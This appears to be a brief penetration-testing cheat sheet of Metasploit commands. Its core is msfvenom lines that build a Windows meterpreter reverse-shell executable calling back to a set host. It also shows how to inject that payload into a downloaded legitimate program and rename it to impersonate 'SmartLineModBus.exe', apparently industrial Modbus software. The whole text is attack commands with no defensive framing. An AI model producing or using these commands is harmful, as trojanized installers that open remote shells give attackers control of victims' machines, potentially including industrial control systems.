### Execute a command
execute -if systeminfo

### Scan for Vulns/0days
msfpescan - windows
msfmachscan - Mac
msfelfscan - unix 

##Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -f exe -a x86 --platform windows -o installer.exe


### Payload inject into real file 
wget website/download.exe
msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 -o tmp.exe -k -x 'Smartline modbus.exe'
mv tmp.exe SmartLineModBus.exe 	